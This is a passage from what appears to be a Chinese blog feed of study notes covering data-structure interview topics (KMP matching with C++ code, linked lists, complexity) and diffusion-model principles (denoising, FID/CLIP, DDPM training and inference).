矩阵的压缩存储</h1><p>数据结构中，提供针对某些特殊矩阵的压缩存储结构。这里所说的特殊矩阵，主要分为以下两类：</p><ul><li>含有大量相同数据元素的矩阵，比如<strong>对称矩阵</strong>；</li><li>含有大量 0 元素的矩阵，比如<strong>稀疏矩阵</strong>、<strong>上（下）三角矩阵</strong>；</li></ul><p>针对以上两类矩阵，数据结构的压缩存储思想是：矩阵中的相同数据元素（包括元素 0）只存储一个。</p><hr><h1 id="10-串的模式匹配"><a href="#10-串的模式匹配" class="headerlink" title="10 串的模式匹配"></a>10 串的模式匹配</h1><p>子串的定位操作通常称为串的模式匹配，他求的是子串（常称模式串）在主串中的位置。</p><p><strong>暴力模式匹配算法的思想</strong>：从主串的第一个字符起，与子串的第一个字符比较，相等则继续比较；不等则从主串的下一个位置起，继续和子串开始比较，直到最后看是否匹配成功。</p><p>以下的子串为：‘<code>abcac</code>’:</p><p><img src="/2024/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%B2/image__rJiE7e7E9.png"></p><h2 id="10-1-KMP算法"><a href="#10-1-KMP算法" class="headerlink" title="10.1 KMP算法"></a>10.1 KMP算法</h2><p>在暴力匹配中，每趟匹配失败都是模式后移一位再从头开始比较。而某趟已匹配相等的字符序列是模式的某个前缀，这种频繁的重复比较相当于模式串在不断地进行自我比较，这就是其低效率的根源。</p><p>因此，可以从分析模式本身的结构着手，如果已匹配相等的前缀序列中有某个后缀正好是模式的前缀，那么就可以将模式向后滑动到与这些相等字符对齐的位置，主串$i$指针无须回溯，并继续从该位置开始进行比较。而模式向后滑动位数的计算仅与模式本身的结构有关，与主串无关。</p><p>先计算出$next $数组：.$next[i] $表示子串切片$s[0:i] $的最长公共前后缀的长度，$next $数组只和子串有关，和主串无关</p><p><img src="/2024/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%B2/image_bNIjs0ceRJ.png"></p><p>再基于$  next  $数组，让子串和主串的每个字符进行匹配，当出现匹配失败时，如果已匹配相等的序列中有某个后缀正好是子串的前缀，那么可以直接将子串滑动到与这些相等字符对齐的位置。这利用了子串本身的最长公共前后缀信息，使得主串指针无须回溯。</p><p><img src="/2024/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%B2/image_jPllgqUW_1.png"></p><p>假设主串长度为$n$, 子串长度为$m$，由于BF 算法中每趟匹配失败都是子串后移一位再从头开始比较，则BF 算法的时间复杂度为$ O(mn)$，而 <code>kmp</code>的时间复杂度仅为$ O(m+n)$。</p><p>代码实现如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1000010</span>;</span><br><span class="line"><span class="type">char</span> p[N], s[N];</span><br><span class="line"><span class="type">int</span> ne[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> n; cin &gt;&gt; n &gt;&gt; p + <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> m; cin &gt;&gt; m &gt;&gt; s + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= n; i ++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">    <span class="keyword">if</span> (p[i] == p[j + <span class="number">1</span>]) j ++;</span><br><span class="line">    ne[i] = j;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i ++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> (j &amp;&amp; s[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">    <span class="keyword">if</span> (s[i] == p[j + <span class="number">1</span>]) j ++;</span><br><span class="line">    <span class="keyword">if</span> (j == n)</span><br><span class="line">    &#123;</span><br><span class="line">      cout &lt;&lt; i - n &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">      j = ne[j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Diffusion Model</title>
      <link href="/2024/08/03/Diffusion-Model/"/>
      <url>/2024/08/03/Diffusion-Model/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Diffusion-Model原理"><a href="#1-Diffusion-Model原理" class="headerlink" title="1 Diffusion Model原理"></a>1 Diffusion Model原理</h1><h2 id="1-1-整体实现"><a href="#1-1-整体实现" class="headerlink" title="1.1 整体实现"></a>1.1 整体实现</h2><p><img src="/2024/08/03/Diffusion-Model/image_AgtDFmAa5A.png"></p><p>首先要生成一个和要生成图片相同大小的杂讯的图，然后每通过一个 Denoise Network 就把噪音过滤掉一些，把这个过程做很多次，就可以得到想要的图片。其中 Denoise 进行的步骤是实现规定好的，对每个 Denoise 分配一个编号，越靠近最终的图片，编号越小。想要的图片其实就在噪音中，只不过把不想要的部分去除，</p><p>上述过程称为 <code>reverser process</code>，把同一个 <code>Denoise Model</code> 使用很多次。但是由于每次输入的图片差异较大，因此如果是同一个模型，可能不一定做的很好。</p><p>所以这个 <code>model</code> 除了会接收图片的输入，还会接收一个当前这个图片 noise 的程度的输入，1000 代表现在 noise 部分很大，而 1 代表现在噪音占比很小。</p><p><img src="/2024/08/03/Diffusion-Model/image_HAd3PaYqTD.png"></p><h2 id="1-2-Denoise内部实现"><a href="#1-2-Denoise内部实现" class="headerlink" title="1.2 Denoise内部实现"></a>1.2 Denoise内部实现</h2><p><img src="/2024/08/03/Diffusion-Model/image_E9xoatePZE.png"></p><ul><li>Noise Predicter：预测这张图片中杂讯的分布，先学习加噪，再进行减噪</li></ul><p>把Noise Predicter输出预测的杂讯剪掉一开始的输入，就得到去掉部分噪音之后的图片。</p><p>为什么要这么设计：因为产生满足噪声分布的数据更简单，因此学习噪声的分布。</p><h2 id="1-3-如何训练Noise-Predictor"><a href="#1-3-如何训练Noise-Predictor" class="headerlink" title="1.3 如何训练Noise Predictor"></a>1.3 如何训练Noise Predictor</h2><p><img src="/2024/08/03/Diffusion-Model/image_zqpItAq3AG.png"></p><p>Noise Predictor的训练数据是人为创造出来的，自己不断对其加噪音，最后得到一个全是噪音的图片。</p><p>这个加噪音的过程称为forward process，又称为duffsion process。通过这个过程，就有了Noise Predictor的训练数据—带噪音的图片以及这是第几次加噪音。</p><p>怎么把用户输入的文字考虑进来？在进行训练的过程中，训练数据需要是图片和文字成对的资料。</p><p>现在常见的文本到图像的生成模型的训练数据中就有很多种语言的数据，现在Denoise部分除了有图片的输入外，还有文字的输入。</p><p><img src="/2024/08/03/Diffusion-Model/image_Ulmf-b2QY3.png"></p><p>通常在Noise Predictor中需要加上一个文字的输入，如下：</p><p><img src="/2024/08/03/Diffusion-Model/image_t6D7k70B62.png"></p><p>训练的部分也需要进行修改，通常在昨晚diffusion process之后，训练的同时给Noise Predicter也是3个输入：图片、文字和第几步。</p><p><img src="/2024/08/03/Diffusion-Model/image_zobMtVoPPk.png"></p><hr><h1 id="2-常见模型分析"><a href="#2-常见模型分析" class="headerlink" title="2 常见模型分析"></a>2 常见模型分析</h1><h2 id="2-1-模型架构"><a href="#2-1-模型架构" class="headerlink" title="2.1 模型架构"></a>2.1 模型架构</h2><p><img src="/2024/08/03/Diffusion-Model/image_LDDopOz3OV.png"></p><p>现在比较好的图像生成模型主要包含三个部分：</p><ol><li><strong>文本编码器</strong>：把文字的叙述变成一个向量</li><li><strong>生成模型</strong>：输出一个中间产物，代表图片被压缩后的版本，可以是一个人可以看懂的模糊的内容，也可以是人看不懂的内容</li><li><strong>解码器</strong>：从压缩后的版本还原为原来的图像</li></ol><p>通常这三个部分分开训练，最后组合在一起使用。</p><h2 id="2-2-模型举例"><a href="#2-2-模型举例" class="headerlink" title="2.2 模型举例"></a>2.2 模型举例</h2><h3 id="2-2-1-Stable-Diffusion"><a href="#2-2-1-Stable-Diffusion" class="headerlink" title="2.2.1 Stable Diffusion"></a>2.2.1 Stable Diffusion</h3><p><img src="/2024/08/03/Diffusion-Model/image_z_REBDlH5V.png"></p><h3 id="2-2-2-Dall-E系列"><a href="#2-2-2-Dall-E系列" class="headerlink" title="2.2.2 Dall-E系列"></a>2.2.2 Dall-E系列</h3><p><img src="/2024/08/03/Diffusion-Model/image_sRWqtHT6h-.png"></p><p>首先是一个文本编码器，之后是一个生成模型，在DALL-E系列中，生成模型有2个：</p><ol><li>Autoregressive model</li><li>Diffusion model</li></ol><h3 id="2-2-3-Imagen"><a href="#2-2-3-Imagen" class="headerlink" title="2.2.3 Imagen"></a>2.2.3 Imagen</h3><p><img src="/2024/08/03/Diffusion-Model/image_DzjceXv4ya.png"></p><ul><li>在imagen中生成的内容就是人可以看懂的内容</li></ul><hr><h1 id="3-模型架构具体分析"><a href="#3-模型架构具体分析" class="headerlink" title="3 模型架构具体分析"></a>3 模型架构具体分析</h1><h2 id="3-1-Text-Encoder"><a href="#3-1-Text-Encoder" class="headerlink" title="3.1 Text Encoder"></a>3.1 Text Encoder</h2><p><img src="/2024/08/03/Diffusion-Model/image_763Q_lDG6-.png"></p><p>可以用GPT或Bert当作encoder，由上图可以分析，文本编码器对于最终的结果影响还是挺大的。</p><p>CLIP Score越大越好，由图a可以分析，随着使用的encoder模型越来越大，所生成的图片的质量越来越高。</p><p>相对而言，从图b可以分析，diffusion model的大小相对来说没有那么重要。</p><h2 id="3-2-Decoder"><a href="#3-2-Decoder" class="headerlink" title="3.2 Decoder"></a>3.2 Decoder</h2><p>只需要使用图片数据就可以训练出来，不用影像和文字的成对的资料。</p><p>如果Decoder的输入是一个小图，那么就找很多个小图和大图的数据来进行训练即可，如下：</p><p><img src="/2024/08/03/Diffusion-Model/image_ex6LcMg4j8.png"></p><p>如果输入是中间产物，这时候需要训练一个Auto-encoder，用于把一个图片编码成一个中间产物，然后把这个中间产物作为Decoder的输入。</p><p><img src="/2024/08/03/Diffusion-Model/image_4rvb1qn8G9.png"></p><p>此时需要训练Encoder和Decoder。</p><h2 id="3-3-Generation-Model"><a href="#3-3-Generation-Model" class="headerlink" title="3.3 Generation Model"></a>3.3 Generation Model</h2><p>生成模型的输入是文字、图片以及步骤数，输出是中间产物。</p><p><img src="/2024/08/03/Diffusion-Model/image_qwE4WZCqrD.png"></p><p>如果要训练一个输出是中间产物的生成模型，则输入就应该是sample噪音之后的中间产物。</p><h2 id="3-4-评估指标"><a href="#3-4-评估指标" class="headerlink" title="3.4 评估指标"></a>3.4 评估指标</h2><h3 id="3-4-1-FID"><a href="#3-4-1-FID" class="headerlink" title="3.4.1 FID"></a>3.4.1 FID</h3><p><img src="/2024/08/03/Diffusion-Model/image_F3Zq-kHGM6.png"></p><p>有一个提前训练好的CNN，然后将模型生成的图像输入到这个CNN中，之后将真实影像的输出结果与生成的分布越接近，那么生成的图像与真实的图像越接近。</p><p>如何计算这两个分布的差距？</p><ul><li>假设这两个分布都是高斯分布，然后计算这两个高斯分布的<code>Frechet Distance</code>，虽然结果看起来比较粗糙，但是结果看起来不错。</li></ul><p>FID需要sample大量的image，才能进行衡量，在图b中的纵坐标的10k就是指采样了10k张image来衡量FID的好坏。</p><h3 id="3-4-2-CLIP"><a href="#3-4-2-CLIP" class="headerlink" title="3.4.2 CLIP"></a>3.4.2 CLIP</h3><p><img src="/2024/08/03/Diffusion-Model/image_31A-U5MAIf.png"></p><p>CLIP是用400 million个图片—文本的数据所训练出来的一个模型，模型里有一个Text Encoder和一个Image Encoder，其中文本编码器输入一段文本，产生一个向量，图像编码器输入一个图片，产生一个向量。如果文本和图像是相关的，那么它们的向量越接近越好。</p><hr><h1 id="4-背后的数学原理"><a href="#4-背后的数学原理" class="headerlink" title="4 背后的数学原理"></a>4 背后的数学原理</h1><h2 id="4-1-训练过程"><a href="#4-1-训练过程" class="headerlink" title="4.1 训练过程"></a>4.1 训练过程</h2><p><img src="/2024/08/03/Diffusion-Model/image_Ion6IaixBV.png"></p><p>详细分析一下训练的算法：</p><ul><li>步骤1：重复操作2~5</li><li>步骤2：采样一个“干净”的图$x_0$出来</li><li>步骤3：从$[1,T]$之间采样一个整数$t$出来</li><li>步骤4：从一个正态分布$N(0,1)$中采样一个$\epsilon$出来，大小和image一样大</li><li>步骤5：实现确定好一个权重$\alpha$，然后将$x_0$和采样得到的$\epsilon$进行加和，得到一个有杂讯的图，其中$\bar{\alpha}<em>{1}, \bar{\alpha}</em>{2}, \ldots \bar{\alpha}_{T}$的设计是从大到小进行变化，所以$t$越大，则$\alpha_t$越大，则在$x_0$上加的噪音越多</li></ul><p>图示过程如下：</p><p><img src="/2024/08/03/Diffusion-Model/image_x-RtHTtQ8D.png"></p><h2 id="4-2-推理过程"><a href="#4-2-推理过程" class="headerlink" title="4.2 推理过程"></a>4.2 推理过程</h2><p><img src="/2024/08/03/Diffusion-Model/image_zbJOaNXqBu.png"></p><p>详细分析一下推理的算法：</p><ul><li>步骤1：从$N(0,1)$中采样一个全是噪音的图记为$x_T$</li><li>步骤2：做reverse process，产生图片</li><li>步骤3：在每次生图的时候先从$N(0,1)$中产生一个噪音$z$</li><li>步骤4：生图的过程，准备2组超参数$\alpha_T$和$\bar{\alpha}<em>T$，然后先将$x_t$送入$\boldsymbol{\epsilon}</em>{\theta}\left(\mathbf{x}<em>{t}, t\right)$产生一个杂讯，然后使用$x_t$减去，之后再乘$\frac{1}{\sqrt{\alpha</em>{t}}}$，但是这里还要再加上一个sample出来的杂讯$z$，得到结果</li></ul><p>推理过程图示如下：</p><p><img src="/2024/08/03/Diffusion-Model/image_su7aVnAY3v.png"></p><hr><h1 id="5-影像生成模型本质上共同目标"><a href="#5-影像生成模型本质上共同目标" class="headerlink" title="5 影像生成模型本质上共同目标"></a>5 影像生成模型本质上共同目标</h1><p><img src="/2024/08/03/Diffusion-Model/image_PNTQp5a7Rb.png"></p><p>当向模型中输入一段文字时，网络的目标其实是<strong>产生一个所有图像的分布</strong>。</p><p>例如，当提示“一只正在奔跑的狗”，此时产生一个有关于奔跑的狗的分布。此外，有语言提示的模型和没有文字提示的模型在本质上没有区别，因此在接下来讨论数学原理时，假设没有文本提示。</p><h2 id="5-1-最大似然估计"><a href="#5-1-最大似然估计" class="headerlink" title="5.1 最大似然估计"></a>5.1 最大似然估计</h2><p>目标是使学习到的分布和目标的分布之间越接近越好。</p><p><img src="/2024/08/03/Diffusion-Model/image_LQvW0VvQEP.png"></p><p>假设模型的参数是$\theta$，模型输出的分布是$P_\theta(x)$，真实的分布是$P_{data}(x)$，进行一下运算：</p><ol><li>首先从$P_{data}(x)$中采样一些数据$\left{x^{1}, x^{2}, \ldots, x^{m}\right}$</li><li>假设能够计算$P_\theta(x^i)$，使用最大似然估计$\theta^{*}&#x3D;\arg \max <em>{\theta} \prod</em>{i&#x3D;1}^{m} P_{\theta}\left(x^{i}\right)$</li></ol><h3 id="5-1-1-最大似然估计和两个分布之间的距离的关系"><a href="#5-1-1-最大似然估计和两个分布之间的距离的关系" class="headerlink" title="5.1.1 最大似然估计和两个分布之间的距离的关系"></a>5.1.1 最大似然估计和两个分布之间的距离的关系</h3><p>$$<br>\begin{aligned} \theta^{*}&#x3D; &amp; \arg \max <em>{\theta} \prod</em>{i&#x3D;1}^{m} P_{\theta}\left(x^{i}\right)&#x3D;\arg \max <em>{\theta} \log \prod</em>{i&#x3D;1}^{m} P_{\theta}\left(x^{i}\right) \ &amp; &#x3D;\arg \max <em>{\theta} \sum</em>{i&#x3D;1}^{m} \log P_{\theta}\left(x^{i}\right) \approx \arg \max <em>{\theta} E</em>{x \sim P_{d a t a}}\left[\log P_{\theta}(x)\right] \ &amp; &#x3D;\arg \max <em>{\theta} \int</em>{x} P_{\text {data }}(x) \log P_{\theta}(x) d x-\int_{x} P_{\text {data }}(x) \log P_{\text {data }}(x) d x \ \quad &amp; &#x3D;\arg \max <em>{\theta} \int</em>{x} P_{\text {data }}(x) \log \frac{P_{\theta}(x)}{P_{d a t a}(x)} d x&#x3D;\arg \min <em>{\theta} K L\left(P</em>{\text {data }} | P_{\theta}\right)\end{aligned}<br>$$</p><p>最后推导出最小化两个分布之间的KL距离，KL越大，代表2个分布之间的差距越大，越小则代表之间的差距越小。</p><h2 id="5-2-VAE"><a href="#5-2-VAE" class="headerlink" title="5.2 VAE"></a>5.2 VAE</h2><p><img src="/2024/08/03/Diffusion-Model/image_9aSZVUk0gZ.png"></p><p>先从高斯分布中采样一个$z$，然后计算得到$G(z)$代表的是一个高斯分布的均值，则有以下：</p><p>$$<br>\begin{array}{l}P_{\theta}(x|z) \propto \exp \left(-|G(z)-x|_{2}\right)\end{array}<br>$$</p><p>具体推导如下（看不懂😭）：</p><p><img src="/2024/08/03/Diffusion-Model/image_GpSDH5Krdn.png"></p><h2 id="5-3-DDPM"><a href="#5-3-DDPM" class="headerlink" title="5.3 DDPM"></a>5.3 DDPM</h2><p><img src="/2024/08/03/Diffusion-Model/image_aGMahJ-c9A.png"></p>]]></content>
      
      
      <categories>
          
          <category> diffusion </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 扩散模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构面经2：线性表</title>
      <link href="/2024/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
      <url>/2024/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E7%BA%BF%E6%80%A7%E8%A1%A8/image_eiTTTEcjAb.png"></p><h1 id="1-各种线性表"><a href="#1-各种线性表" class="headerlink" title="1 各种线性表"></a>1 各种线性表</h1><h2 id="1-1-优缺点"><a href="#1-1-优缺点" class="headerlink" title="1.1 优缺点"></a>1.1 优缺点</h2><p><strong>顺序表</strong></p><ul><li>优点：可以随机存取，快；存储密度大</li><li>缺点：插入、删除效率低；存储空间固定，分多了浪费，分少了又不足</li></ul><p><strong>单链表</strong></p><ul><li>优点：插入、删除效率高；空间可动态分配</li><li>缺点：不能随机存取，要顺序存取，慢；存储密度不大（有指针域）</li></ul><p><strong>静态链表</strong>：融合顺序表和单链表的优点，既能快速访问元素，又能快速插入、删除元素</p><h2 id="1-2-对比"><a href="#1-2-对比" class="headerlink" title="1.2 对比"></a>1.2 对比</h2><h3 id="1-2-1-存取（读写）方式"><a href="#1-2-1-存取（读写）方式" class="headerlink" title="1.2.1 存取（读写）方式"></a>1.2.1 存取（读写）方式</h3><p>顺序表可以顺序存取，也可以随机存取，链表只能从表头顺序存取元素。例如在第i个位置上执行存或取的操作，顺序表仅需一次访问，而链表则需从表头开始依次访问i次。</p><h3 id="1-2-2-逻辑结构与物理结构"><a href="#1-2-2-逻辑结构与物理结构" class="headerlink" title="1.2.2 逻辑结构与物理结构"></a>1.2.2 逻辑结构与物理结构</h3><p>采用顺序存储时，逻辑上相邻的元素，对应的物理存储位置也相邻。而采用链式存储时，逻辑上相邻的元素，物理存储位置则不一定相邻，对应的逻辑关系是通过指针链接来表示的。</p><h3 id="1-2-3-查找、插入和删除操作"><a href="#1-2-3-查找、插入和删除操作" class="headerlink" title="1.2.3 查找、插入和删除操作"></a>1.2.3 查找、插入和删除操作</h3><p>对于按值查找，顺序表无序时，两者的时间复杂度均为$O(n)$；顺序表有序时，可采用折半查找，此</p><p>时的时间复杂度为$O(log_2n)$ 。</p><p>对于按序号查找，顺序表支持随机访问，时间复杂度仅为$O(1)$, 而链表的平均时间复杂度为$O(n)$ 。</p><p>顺序表的插入、删除操作，平均需要移动半个表长的元素。</p><p>链表的插入、删除操作，只需修改相关结点的指针域即可。由于链表的每个结点都带有指针域，故而存储密度不够大。</p><h3 id="1-2-4-空间分配"><a href="#1-2-4-空间分配" class="headerlink" title="1.2.4 空间分配"></a>1.2.4 空间分配</h3><p>顺序存储在静态存储分配情形下，一旦存储空间装满就不能扩充，若再加入新元素，则会出现内存溢出，因此需要预先分配足够大的存储空间。预先分配过大，可能会导致顺序表后部大量闲置；预先分配过小，又会造成溢出。动态存储分配虽然存储空间可以扩充，但需要移动大量元素，导致操作效率降低，而且若内存中没有更大块的连续存储空间，则会导致分配失败。</p><p>链式存储的结点空间只在需要时申请分配，只要内存有空间就可以分配，操作灵活、高效。</p><hr><h1 id="2-单链表"><a href="#2-单链表" class="headerlink" title="2 单链表"></a>2 单链表</h1><h2 id="2-1-插入"><a href="#2-1-插入" class="headerlink" title="2.1 插入"></a>2.1 插入</h2><p><img src="/2024/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E7%BA%BF%E6%80%A7%E8%A1%A8/image_acNdwMKBRB.png"></p><h2 id="2-2-删除"><a href="#2-2-删除" class="headerlink" title="2.2 删除"></a>2.2 删除</h2><p><img src="/2024/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E7%BA%BF%E6%80%A7%E8%A1%A8/image_u26L9zHWen.png"></p><hr><h1 id="3-循环链表"><a href="#3-循环链表" class="headerlink" title="3 循环链表"></a>3 循环链表</h1><h2 id="3-1-单向循环链表"><a href="#3-1-单向循环链表" class="headerlink" title="3.1 单向循环链表"></a>3.1 单向循环链表</h2><p><img src="/2024/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E7%BA%BF%E6%80%A7%E8%A1%A8/image_u9u8s8qiMB.png"></p><h2 id="3-2-双向循环链表"><a href="#3-2-双向循环链表" class="headerlink" title="3.2 双向循环链表"></a>3.2 双向循环链表</h2><p><img src="/2024/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E7%BA%BF%E6%80%A7%E8%A1%A8/image_bL4ah4O1pV.png"></p><hr><h1 id="4-静态链表"><a href="#4-静态链表" class="headerlink" title="4 静态链表"></a>4 静态链表</h1><p>静态链表需分配连续的内存空间，借助数组来描述链表，每个结点包含数据+游标（下一个元素的数组索引）。</p><p><img src="/2024/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E7%BA%BF%E6%80%A7%E8%A1%A8/image_ipkzMcMSNx.png"></p><hr><h1 id="5-头指针和头结点的区别？"><a href="#5-头指针和头结点的区别？" class="headerlink" title="5 头指针和头结点的区别？"></a>5 头指针和头结点的区别？</h1><ul><li><strong>头指针</strong>：指向第一个节点存储位置的指针，具有标识作用，头指针是链表的必要元素，无论链表是否为空，头指针都存在。</li><li><strong>头结点</strong>：放在第一个元素节点之前，便于在第一个元素节点之前进行插入和删除的操作，头结点不是链表的必须元素，可有可无，头结点的数据域也可以不存储任何信息。</li></ul><hr><h1 id="6-查找单链表中倒数第-k-个结点"><a href="#6-查找单链表中倒数第-k-个结点" class="headerlink" title="6 查找单链表中倒数第 k 个结点"></a>6 查找单链表中倒数第 k 个结点</h1><ol><li>建立两个指针：fast、slow</li><li>先让fast走k步</li><li>再让fast和slow一起走，直到fast走到末尾后一位，slow指向的就是倒数第k个结点</li></ol><p><img src="/2024/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E7%BA%BF%E6%80%A7%E8%A1%A8/image_Pr6uT0PdTl.png"></p><hr><h1 id="7-单链表就地逆序（空间复杂度为O-1-）"><a href="#7-单链表就地逆序（空间复杂度为O-1-）" class="headerlink" title="7 单链表就地逆序（空间复杂度为O(1)）"></a>7 单链表就地逆序（空间复杂度为O(1)）</h1><ol><li>建立两个指针：p、q</li><li>p用于遍历链表中的每个结点</li><li>q用于头插法创建新的逆序链表</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">reverse</span><span class="params">(ListNode* head)</span> </span><br><span class="line">&#123;</span><br><span class="line">    ListNode *p, *q;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    head-&gt;next = nullptr;</span><br><span class="line">    <span class="keyword">while</span> (p)  <span class="comment">// p用于遍历每个节点</span></span><br><span class="line">    &#123;</span><br><span class="line">        q = p;</span><br><span class="line">        p = p-&gt;next;  <span class="comment">// 在该节点的next指针改变前更新p</span></span><br><span class="line">        q-&gt;next = head-&gt;next;  <span class="comment">// 类似头插法</span></span><br><span class="line">        head-&gt;next = q; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="8-判断链表有没有环"><a href="#8-判断链表有没有环" class="headerlink" title="8 判断链表有没有环"></a>8 判断链表有没有环</h1><p>法1：使用map来保存对应的内存地址，如果重复访问，则一定有环</p><p>法2：快慢指针法，从头开始设置两个指针，快指针每次走2 步，慢指针每次走1 步，如果快指针先碰到尾，则无环，否则两个指针之后一定会重合，则有环。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构面经1：绪论</title>
      <link href="/2024/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E7%BB%AA%E8%AE%BA/"/>
      <url>/2024/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E7%BB%AA%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E7%BB%AA%E8%AE%BA/image_eOAQycn8d7.png"></p><h1 id="1-时间复杂度"><a href="#1-时间复杂度" class="headerlink" title="1 时间复杂度"></a>1 时间复杂度</h1><p>一个语句的频度是指该语句在算法中被重复执行的次数。算法中所有语句的频度之和记为 $T(n)$，它是该算法问题规模 $n$ 的函数。</p><p>时间复杂度主要分析 $T(n)$ 的数量级。算法中基本运算（最深层循环内的语句）的频度与 $T(n)$ 同数量级，因此通常采用算法中基本运算的频度$f(n)$来分析算法的时间复杂度。因此，算法的时间复杂度记为<br>$$<br>    T(n) &#x3D; O(f(n))<br>$$</p><p>$O$ 的含义是 $T(n)$ 的数量级，其严格的数学定义是：若 $T(n)$ 和 $f(n)$ 是定义在正整数集合上的两个函数，则存在正常数 $C$ 和 $n_0$，使得当 $n \geq n_0$ 时，都满足 $0 \leq T(n) \leq Cf(n)$。</p><p>算法的时间复杂度不仅依赖于问题的规模 $n$，也取决于待输入数据的性质（如输入数据元素的初始状态）。</p><hr><h1 id="2-空间复杂度"><a href="#2-空间复杂度" class="headerlink" title="2 空间复杂度"></a>2 空间复杂度</h1><p>算法的空间复杂度 $S(n)$ 定义为该算法所耗费的存储空间，它是问题规模 $n$ 的函数。记为</p><p>$$<br>    